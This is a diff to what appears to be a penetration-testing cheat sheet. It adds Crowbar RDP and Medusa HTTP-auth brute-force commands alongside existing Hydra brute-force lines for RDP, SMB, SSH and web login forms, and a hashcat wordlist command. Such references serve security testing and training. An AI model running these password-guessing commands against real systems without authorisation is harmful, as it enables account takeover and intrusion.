@@ -73,11 +73,17 @@ cat pw | hashcat -r/usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
 RDP Brute Force - Hydra
 `hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>`
 
+RDP Brute Force -  Crowbar
+`crowbar -b rdp -s XX.XX.XX.XX/32 -u admin -C ~/password-file.txt -n 1`
+
 SMB Brute Force - Hydra
 `hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb`
 
 SSH Brute Force - Hydra
 `hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>`
+
+HTTP htaccess Attack with Medusa
+`medusa -h XX.XX.XX.XX -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
 
 HTTP POST Login Form (login forms) Brute Force - Hydra, brute force username and password
 `hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:usernamefieldname=^USER^&passwordfieldname=^PASS^:Login failed text" -vV -f`
